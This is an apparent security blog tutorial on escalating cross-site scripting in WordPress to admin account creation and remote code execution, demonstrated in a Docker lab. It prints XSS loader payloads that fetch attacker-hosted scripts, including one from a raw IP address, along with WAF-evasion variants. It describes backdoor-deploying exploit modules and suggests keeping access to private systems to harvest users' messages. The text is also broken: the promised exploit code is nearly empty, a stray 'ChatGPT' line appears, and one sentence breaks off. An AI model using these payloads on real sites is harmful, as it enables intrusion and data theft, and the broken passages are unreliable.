        <b>Cross-site Scripting (XSS)</b> is one of the most common vulnerabilities found in web applications.
        Due to its widespread presence in most web environments, its potential is often underestimated, limited only to
        <i>Sessions Hijacking</i>, <i>Open Redirects</i>, <i>Phishing</i>, among others. However, in certain scenarios,
        it is possible to completely compromise systems by effectively exploiting this flaw.

        <br><br>
        In this article, I will demonstrate the real potential of <b>Cross-Site Scripting (XSS)</b> in <b>Content
            Management Systems (CMS)</b> and <b>E-Commerce</b> platforms, as well as explore how an attacker could
        achieve <b>Remote Code Execution (RCE)</b> through <b>XSS</b> in these systems.

        <br><br>
        However, before we proceed, it is essential to understand the basic concepts of <b>Cross-Site Scripting
            (XSS)</b>, cookie attributes <b>(HttpOnly, SameSite)</b>, <b>Same-Origin Policy (SOP)</b>, <b>Cross-Origin
            Resource Sharing (CORS)</b>, <b>CSRF Tokens</b>, among others. If you are already familiar or wish to skip
        directly to the content of the <b>POST</b> <a href="#\">(click here)</a>.

        <br><br><br>

        <h2>What is Cross-Site Scripting (XSS)</h2>

        <b>Cross-Site Scripting (XSS)</b> is a vulnerability that allows the insertion of <b>JavaScript</b> code into an
        application. This code is interpreted by the user's browser, enabling access to information from the vulnerable
        application that the user is navigating, such as session cookies, stored credentials, among others. This allows
        an attacker to perform actions on behalf of a legitimate user, bypassing the <b>Same-Origin Policy (SOP)</b>
        implemented in web browsers.

        <br><br>

        <br><br>

        <h2>What is Same-Origin Policy (SOP)</h2>
        <b>Same-Origin Policy (SOP)</b> is a defense mechanism implemented by default in all browsers. Its function is to prevent the <b>READING</b> of requests sent <i>Cross-Origin</i>, that is, requests that are not from the <i>Same-Origin</i>.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110010.png" width="570" height="300"></center>
        <br><br>

        In the context of the web, an origin can be summarized as follows:
        <table>
            <thead>
                <tr>
                    <th>URL</th>
                    <th>Outcome</th>
                    <th>Reason</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>http://store.company.com/dir2/other.html</td>
                    <td>Same origin</td>
                    <td>Only the path differs</td>
                </tr>
                <tr>
                    <td>http://store.company.com/dir/inner/another.html</td>
                    <td>Same origin</td>
                    <td>Only the path differs</td>
                </tr>
                <tr>
                    <td>https://store.company.com/page.html</td>
                    <td>Failure</td>
                    <td>Different protocol</td>
                </tr>
                <tr>
                    <td>http://store.company.com:81/dir/page.html</td>
                    <td>Failure</td>
                    <td>Different port (http:// is port 80 by default)</td>
                </tr>
                <tr>
                    <td>http://news.company.com/dir/page.html</td>
                    <td>Failure</td>
                    <td>Different host</td>
                </tr>
            </tbody>
        </table>

        source: <a
            href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a>

        <br><br>
        To be considered <i>Same-Origin</i>, websites must have identical <b>HTTP schemas</b>, meaning they must share
        the same structure of <b>(schema://host:port/)</b>, with flexibility only in directories and files.<br><br>

        As mentioned earlier, the <b>Same-Origin Policy (SOP)</b> only blocks reading responses from different origins
        <i>(Cross-Origin)</i>. This means it is still possible to send authenticated requests using <b>JavaScript</b>,
        impersonating the legitimate user through a different origin site, in a technique known as <b>Cross-Site Request
            Forgery (CSRF)</b>. Below, we'll see more information about it.

        <br><br><br>

        <h2>Cross-Site Request Forgery (CSRF)</h2>
        <b>Cross-Site Request Forgery (CSRF)</b> involves performing actions on behalf of the user through <b>HTML</b>
        or <b>JavaScript</b> code from different origins <i>(Cross-Origin)</i>. However, as we will see, there are
        several mechanisms that can block the exploitation of <b>CSRF</b>. Nevertheless, this attack is extremely
        powerful and, in certain scenarios, can be more harmful than a <b>Cross-Site Scripting (XSS)</b> attack, as it
        does not require a flaw in the application's code itself. Moreover, it can easily spread among users simply by
        accessing a seemingly innocuous website.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110011.png" width="800" height="580"></center>
        <br><br>

        <h2>SameSite Cookie Attribute</h2>

        <b>SameSite</b> is a cookie security mechanism whose primary functionality is to block or allow the sending of
        cookies from different origins <i>(Cross-Origin)</i> requests. This attribute has <b>3</b> categories:

        <ul>
            <li><b>None</b>: Allows sending cookies from different origins in both <b>GET</b> and <b>POST</b> requests.
                This means that if your site's cookie attributes are configured with the <b>“SameSite: None”</b>
                attribute, and a user with an established session on the target site visits another malicious site from
                a different origin <i>(Cross-Origin)</i>, the malicious site can make <b>GET</b> and <b>POST</b>
                requests to the target site on behalf of the victim using <b>JavaScript</b>.</li>
            <li><b>Lax</b>: Allows sending cookies from different origins only in <b>GET</b> requests. This means that
                if your site's cookie attributes are configured with the <b>"SameSite: Lax"</b> attribute, or if the
                <b>SameSite</b> attribute is not specified by the application developer during cookie assignment, the
                cookie automatically receives the <b>"SameSite: Lax"</b> attribute in <b>Chrome</b> browsers. In this
                scenario, if a user with an established session on the target site visits another malicious site from a
                different origin <i>(Cross-Origin)</i>, the malicious site can make <b>GET</b> requests to the target
                site on behalf of the victim using <b>JavaScript</b>.
            </li>
            <li><b>Strict</b>: Completely blocks the sending of cookies from different origins <i>(Cross-Origin)</i>,
                being the most restrictive scenario.</li>
        </ul>

        <br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110100.png"></center>
        <br>

        However, as mentioned earlier, the malicious site cannot view the responses of its requests due to the
        <b>Same-Origin Policy (SOP)</b> mechanism. However, there is a configuration mechanism for <b>SOP</b> called
        <b>Cross-Origin Resource Sharing (CORS)</b>. If configured incorrectly, <b>CORS</b> can bypass the <b>SOP</b>,
        becoming an exploitation vector.

        <br><br><br>
        <h2>Cross-Origin Resource Sharing (CORS)</h2>
        <b>Cross-Origin Resource Sharing (CORS)</b> is a mechanism for configuring the <b>Same-Origin Policy (SOP)</b>.
        In other words, <b>CORS</b> allows developers to "weaken" the restrictive rules of <b>SOP</b>. You might be
        wondering, why would a developer do this? The answer is simple. Some services, such as providers and
        <b>APIs</b>, require that the client (user) receive and view the response to their request, which is only
        possible through <b>CORS</b>.

        <br><br>

        <b>CORS</b> has several configuration <i>headers</i>:

        <ul>
            <li><b>Access-Control-Allow-Origin;</b></li>
            <li><b>Access-Control-Expose-Headers;</b></li>
            <li><b>Access-Control-Max-Age;</b></li>
            <li><b>Access-Control-Allow-Credentials;</b></li>
            <li><b>Access-Control-Allow-Methods;</b> and</li>
            <li><b>Access-Control-Allow-Headers</b>.</li>
        </ul>
        However, the most commonly used are:

        <ul>
            <li><b>Access-Control-Allow-Origin;</b> and</li>
            <li><b>Access-Control-Allow-Credentials</b>.</li>
        </ul>
        <br>
        The <i>header</i> <b>"Access-Control-Allow-Origin"</b> is an essential component of <b>CORS</b> that determines
        which <i>Cross-Origin</i> sites are allowed to access the responses of requests. However, by default, when only
        specifying the <i>header</i> <b>"Access-Control-Allow-Origin"</b>, the responses of requests are returned as
        non-authenticated.<br><br>
        This means that even if the user makes authenticated <i>Cross-Origin</i> requests, whether through the
        <b>SameSite “Lax”</b> or <b>“None”</b> attributes, the response sent back to the user will be treated as if the
        user is not authenticated. However, we know that this is not the reality. This is where the <i>header</i>
        <b>"Access-Control-Allow-Credentials"</b> comes into play.

        <br><br>

        The <i>header</i> <b>"Access-Control-Allow-Credentials"</b> is a component of <b>CORS</b> that determines
        whether responses to <i>Cross-Origin</i> requests, as specified by the <i>header</i>
        <b>"Access-Control-Allow-Origin"</b>, will be sent to the user as authenticated or non-authenticated.
        This <i>header</i> has two attributes: <b>"true"</b> and <b>"false"</b>.<br><br>

        When the attribute is set to <b>"true"</b>, the responses to requests are sent to the user in an authenticated
        manner. On the other hand, when the attribute is set to <b>"false"</b>, or if the <i>header</i>
        <b>"Access-Control-Allow-Credentials"</b> is not specified, the responses to requests are returned to the user
        as non-authenticated.

        <br><br>

        <br><br>

        <h2>CSRF Tokens</h2>
        <b>CSRF Tokens</b> are random values generated and validated by the server for every request sent to the
        application. Their main function is to mitigate <b>Cross-Site Request Forgery (CSRF)</b> attacks, since through
        a <b>CSRF</b> attack, it is not feasible to obtain the application's response (unless <b>CORS</b> is
        misconfigured, as seen earlier).

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110110.png" width="900" height="600"></center>
        <br><br>

        <h2>HttpOnly Cookie Attribute</h2>

        Last but not least, the <b>HttpOnly</b> attribute is a crucial mechanism that prevents the reading of session
        cookie values, even when the script is being executed in the same <i>origin</i> or in different <i>origins</i>.
        While this is effective in protecting session cookies, it is still possible to make requests on behalf of the
        user.

        <br><br><br>

        <h2 id="\">XSS to RCE Explanation</h2>

        Most <b>CMSs</b> and <b>E-Commerce</b> platforms implement robust defense mechanisms against <b>Cross-Site
            Request Forgery (CSRF)</b> attacks. However, often the same level of protection is not applied or it can be
        challenging to mitigate <b>Cross-Site Scripting (XSS)</b> attacks. The danger lies in our understanding of these
        applications structure, including their internal construction, request flows, among other aspects, especially
        given their open-source nature. With this knowledge and the ability to execute <b>JavaScript</b> in the <i>same
            origin</i> as the application—whether through vulnerable plugins, themes, or core application flaws—it is
        feasible to cause significant impact, resulting in <b>Remote Code Execution (RCE)</b> on these systems. The
        ability to execute <b>JavaScript</b> in the <i>same origin</i> bypasses protections like <b>CSRF Tokens</b>,
        <b>Same-Origin Policy (SOP)</b>, <b>SameSite</b>, among others, with the <b>HttpOnly</b> attribute posing a
        challenge in some cases. However, even without access to user session cookies, it is still possible to make
        requests to the application, impersonating the user, even in the presence of the <b>HttpOnly</b> attribute.

        <br><br>

        These possibilities for <b>Remote Code Execution (RCE)</b> are exacerbated by the fact that these systems have
        multiple management interfaces at both the application and server levels. While many companies may not consider
        this a risk because these interfaces are typically accessed only with elevated privileges (administrative
        users), in reality, this creates perfect scenarios for compromising these servers through vulnerabilities such
        as <b>Cross-Site Scripting (XSS)</b>. The complexity of these systems provides numerous opportunities to exploit
        and create sophisticated attacks. More details on these attack chains will be discussed further.

        <br><br>
        <h2>Building the Exploits</h2>
        First, we need to choose a service. This service could be an open-source project or even private systems. Often,
        by reading the application's JavaScript files, it is feasible to understand its operation, functionalities,
        interesting features, and create exploits based on that. I have developed exploits for private services before,
        but since they are private, I am not allowed to disclose them. However, all of them were created by reading the
        JavaScript files, understanding the application logic that runs authenticated operations, and writing exploits
        based on these files. So, do not hesitate to try understanding the application logic through JavaScript code, as
        it can be a gold mine in certain environments. For this example, let's create an exploit for <b>WordPress</b>.
        First of all, we need an updated and stable instance of <b>WordPress</b> that works smoothly. During my
        research, I used <b>Bitnami</b>'s <b>Docker</b> images, which we will also use in this example.
        <br><br>
        We can download the latest <b>WordPress</b> <b>Docker</b> image available from the <b>Bitnami</b> website at <a
            href="https://bitnami.com/stack/wordpress/containers">bitnami.com/stack/wordpress/containers</a>, or
        directly through the command:
        <pre>curl -sSL https://raw.githubusercontent.com/bitnami/containers/main/bitnami/wordpress/docker-compose.yml > docker-compose.yml</></pre>
        <br><br>
        After downloading the "docker-compose.yml" file, we will deploy our application using the command:
        <pre><code>docker-compose up</code></pre>

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00110111.png" width="1450" height="450"></center>
        <br><br>

        Once the application is successfully deployed, we will authenticate using a user with permissions to perform
        interesting operations. In the case of WordPress, this user would be the administrator. The default
        administrator credentials for <b>WordPress Bitnami</b> are:<br><br>

        <center>
            <code>
                <h3>
                    Username: user<br>
                    Password: bitnami
                </h3>
            </code>
        </center>

        <br>
        After authenticating, it is crucial to navigate through the system and look for interesting functionalities that
        may grant us <b>Remote Code Execution (RCE)</b> or privileged access. In the case of <b>WordPress</b>, we can
        achieve this goal by exploring custom installed plugins that may have authenticated vulnerabilities, altering
        our user's privileges, adding a new user account with administrative privileges, editing built-in
        <b>WordPress</b> plugins, editing built-in <b>WordPress</b> themes, exploring authenticated vulnerabilities in
        the <b>WordPress</b> core itself, among other possibilities.

        <br><br>
        For this example, let's create an account with administrative privileges. With this account, we can navigate
        through the application via the graphical interface to search for other vectors that allow us to expand our
        access and achieve <b>RCE</b> on the server. In private systems, we could add an administrative account,
        maintain access, and collect as much information as possible, such as WhatsApp conversations, email exchanges
        through the application, system logs, among other data, while our account remains active.

        <br><br>
        In our Docker lab environment for WordPress, we are logged in as the administrator user <b>(user)</b>, where we
        will explore the functionality to add new users in the <b>"Users"</b> menu.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00111000.png"></center>
        <br>

        The approach I use involves going through the entire workflow of an interesting feature, capturing the requests
        made to the application, and analyzing each one in detail. For demonstration purposes, let's apply this to the
        user addition functionality.

        <br><br>
        <h3>(1) Creating a new administrator user in the application</h3>

        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/00111001.png"></center>
        <br>

        <h3>(2) User successfully added</h3>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110000.png"></center>
        <br>

        After completing the process of adding a user, we can review the requests made during this process. The requests
        marked in red are the ones we need to delve into and replicate their behaviors in our exploit.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110001.png" width="1450"></center>
        <br>

        The first request <b>(324)</b> performs a <b>GET</b> to the file <b>"/wp-admin/user-new.php"</b> and retrieves
        the <b>CSRF Token "50bee24cef"</b>. Save this token as it will be used in subsequent requests.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110010.png" width="1420"></center>
        <br>

        Through the browser, the user fills out the fields with the account information they wish to add. Upon
        completion, a request is sent to the application containing this data. In our case, a <b>POST request (335)</b>
        is made to the file <b>"/wp-admin/user-new.php"</b>, containing parameters such as <i>user_login, email, pass1,
            pass2, role, pw_weak</i>, along with the <b>CSRF Token "_wpnonce_create-user"</b>.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110011.png" width="1410"></center>
        <br>

        However, it is important to be aware that when attempting to perform the same request to the application again,
        we receive a completely different response. This could mean two things: first, that our <b>CSRF Token</b> has
        expired and we need to generate a new one by making a new <b>GET</b> request to <b>"/wp-admin/user-new.php"</b>.
        Second, it could mean that there is already a user registered with the same information as the user we are
        trying to register.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110100.png" width="1410"></center>
        <br>

        Through the HTML rendering functionality of <b>Burp Suite</b> <i>"render"</i>, it's possible to observe that
        there is already a user registered in the application with our email and username. It is crucial to be aware of
        these situations because when developing more complex exploits, you need to be prepared to handle issues like
        this. Remember that, in most cases, we only have one chance to execute our exploit.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110101.png" width="1410"></center>
        <br>

        Here we identified a pattern. If the application responds with a status code <b>"302 Found"</b> and returns a
        <i>Location</i> header to <b>"users.php?update=add&id={ID}"</b>, it means our user was successfully added. On
        the other hand, if the application responds with a status code <b>"200 OK"</b> and returns an <b>HTML</b> code
        containing the string <i>"already registered"</i>, this indicates that an error occurred and our user was not
        added.

        <br><br>
        In the final step of our user addition workflow in the application, a <b>GET</b> request is made to the file
        <b>"/wp-admin/users.php?update=add&id={ID}" (336)</b>, as specified by the application in the <i>Location</i>
        header. By using the <b>Burp Suite</b>'s <b>HTML</b> rendering functionality again, we can confirm that our user
        has been successfully added. However, more importantly for our exploit, we have two fields that we can check to
        validate if the user has indeed been added. First, through the message <i>"New user created"</i>. Second, and
        more reliably, by searching for the name or email of our user, making a request to the file
        <b>"/wp-admin/users.php"</b>.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100110110.png" width="1450"></center>
        <br>

        Let's recap our steps. First, we need to make a <b>GET</b> request to the file <b>"/wp-admin/user-new.php"</b>
        and extract the <b>CSRF Token</b> from its <b>HTML</b> response. Next, we will make a <b>POST</b> request to the
        file <b>"/wp-admin/user-new.php"</b>, passing as parameters the extracted <b>CSRF Token</b>
        <b>"_wp_nonce_create-user"</b> and the user account information we want to add to the application
        <i>(user_login, email, pass1, pass2, role, pw_weak)</i>. After receiving the response from this <b>POST</b>
        request, we will check if we received a <b>"302 Found"</b> status code and if the <i>"Location"</i> header
        contains the string <b>"/wp-admin/users.php?update=add&id={ID}"</b>. Next, we will access the <b>URL</b> from
        the <i>Location</i> header and verify if our user's information has been successfully added, looking for the
        string <b>"New User created"</b> or more reliably, checking for our added account information such as username
        or email.

        <br><br>

        Now that we understand the entire flow of how user creation happens and the potential issues that may arise
        during the process, it's time for the fun part: creating our exploit. Feel free to use any method for making and
        manipulating requests (<b>Fetch</b>, <b>XMLHTTPRequest</b>, <b>JQuery</b>, <b>Axios</b>, etc.). In this example,
        I will use <b>XMLHTTPRequest</b>.

        <br><br>

        As we can see, in just <b>28</b> lines of code, we were able to complete the entire attack chain. However, it's
        important to note that this code is just a demonstration. It lacks error handling and callbacks to indicate if
        the exploitation was successful. In a real-world scenario, you would need to write a more sophisticated exploit.
        Nonetheless, for understanding the basic logic behind the exploitation, this code is sufficient.

        <center>code snippet</center>
        <pre><code>

console.log("The user has been successfully created!");

</code></pre>

        <br>

        For demonstration purposes, we have created a file named <b>"searcher.php"</b> in the directory of the
        vulnerable <b>Wordpress</b> instance for <b>Cross-Site Scripting (XSS)</b>. However, in a real-world scenario,
        you would need to exploit a genuine <b>XSS</b> vulnerability.

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100111000.png"></center>
        <br>

        <br><br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011000100111001.png"></center>
        <br>

        From this <b>XSS</b> point, now we need to import our exploit. This can be done in several ways. The most common
        is through the tag:<br><br>

        <center>
            <pre><code>&lt;script src=""&gt;&lt;/script&gt;</code></pre>
        </center>

        <br>
        However, this approach is often blocked by <b>WAFs</b>. There are other lesser-known techniques for importing
        <b>JavaScript</b> files, which can help circumvent some <b>WAFs</b>. One of them is through the tags:<br><br>

        <center>
            <pre><code>&lt;img src/onerror=import('http:example.com')&gt;
                &lt;img src/onerror=s=document.createElement('script');s.src='http://example.com/X.js';document.body.appendChild(s)&gt;</code></pre>
        </center>

        <br>
        Or if the application is using <b>jQuery</b>, we can also use:

        <center>
            <pre><code>$.getScript('http:example.com')</code></pre>
        </center>

        <br><br>
        Now that we have various ways to import our scripts, let's import our exploit <b>"AddUser.js"</b>.

        <br><br>
        Feel free to host your exploit on any domain, <b>VPS</b>, through the application's own <b>File Upload</b>, etc.
        In our case, we use <b>GCP</b> to host our file <b>"AddUser.js"</b> on a server.

        <br><br>
        <a style="color:red">Note: If your application is using <b>HTTPS</b>, your server where the exploit is hosted
            must also use <b>HTTPS</b>. Otherwise, you will receive the following error:</a>

        <br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110000.png" width="1500"></center>
        <br><br>


        ChatGPT
        After hosting our exploit, we need to import it into the application via <b>XSS</b>. In this case, we use the
        traditional approach <code>&lt;script src=""&gt;&lt;/script&gt;</code>, with the following payload:
        <code>https://wordpress.local/searcher.php?search=&lt;script src="https://34.125.48.153/AddUser.js"&gt;</script>
        </code>

        <br><br>
        Application requesting our exploit <b>"AddUser.js"</b>.

        <br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110001.png" width="1500"></center>
        <br><br>

        After a user with administrative session in <b>WordPress</b> accesses our vulnerable <b>URL</b>, which is
        importing our exploit, our attack chain is executed. This results in making the necessary requests to create our
        user <b>“nowak0x01”</b> as an administrator in the application.

        <br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110010.png" width="1500"></center>
        <br><br>

        Where our user has been successfully added to the application.

        <br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110011.png"></center>
        <br><br>

        Afterwards, we can log into the application with our newly added user and explore other Remote Code Execution
        (RCE) vectors or interesting functionalities, as mentioned earlier. However, let's approach this in a more
        intriguing manner.

        <br>
        <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110100.png"></center>

            Adding a user, especially with administrator privileges, in a <b>WordPress</b> or any system,
            can raise suspicions. This is where the true magic of <b>XSS</b> comes into play; you just need to be
            creative. We understand that developing exploits can be a bit laborious, and sometimes, we don't have time
            to dedicate to writing an exploit that demonstrates the full impact a vulnerability can have on the client's
            environment. For this reason, I have developed exploits for the most popular and widely used <b>CMS</b> and
            <b>E-Commerce</b> platforms. These exploits include various modules, such as:

            <ul>
                <li><b>(Privilege Escalation)</b> - <i>Creates an administrator user on the application</i>;</li>
                <li><b>(RCE)</b> - <i>Built-In Plugin’s Edit</i>;</li>
                <li><b>(RCE)</b> - <i>Built-In Theme’s Edit</i>;</li>
                <li><b>(RCE)</b> - <i>Plugin Upload - Upload your custom plugin (backdoor) to the application</i>;</li>
                <li><b>(Custom)</b> - <i>Custom Exploits for Third-Party Plugins/Themes</i>.</li>
            </ul>

            For demonstration purposes, we will use <b>WPXStrike</b> along with the built-in theme editing module of
            <b>WordPress</b>. If you want to understand how the tool works, check out the examples provided on
            <b>GitHub</b>.

            <br><br>
            <center><img src="/img/papers/76bc0832a8f682a7e0ed921627f85d1d/0011001000110110.png" width="1500"></center>

            <br><br>

            As we can see, the file <b>"patterns/hidden-404.php"</b> in the <b>"Twenty Twenty-Three"</b> theme of
            <b>WordPress</b> does not currently contain any changes or malicious code. However, after executing our
            exploit, our <i>backdoor</i> will be deployed in this file.

            <br><br>

            After a user with administrative session in <b>WordPress</b> accesses our vulnerable <b>XSS</b> <b>URL</b>,
            which imports our exploit, our attack chain is executed. This results in making the necessary requests to

            As we've seen, obtaining Remote Code Execution (RCE) through XSS isn't as difficult as it may seem, although
            it does require time and effort. I hope you enjoyed this post and understood the logic behind the technique,
            the attack chain, and how to use this methodology to create new exploits in various services. Thank you if
            you've read this far. I wish you an excellent week ahead and happy studying.
